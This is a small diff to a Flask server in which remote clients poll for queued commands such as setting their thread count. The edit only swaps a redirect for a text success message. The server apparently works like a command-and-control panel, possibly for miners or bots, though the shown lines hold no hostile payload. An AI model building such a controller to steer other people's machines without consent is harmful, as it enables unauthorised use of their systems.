@@ -589,7 +589,8 @@ def set_threads(client_id):
 
     COMMAND_QUEUE[client_id] = {"command": "set_threads", "threads": new_threads}
     print(f"[+] Command queued for '{client_id}': Set threads to {new_threads}")
-    return redirect(url_for('index'))
+    # Return a success message directly
+    return f"Command 'set_threads' queued for client '{client_id}' with {new_threads} threads.", 200
 @app.route("/get_command/<client_id>", methods=["GET"])
 def get_command(client_id):
     """Allows clients to poll for and receive commands."""
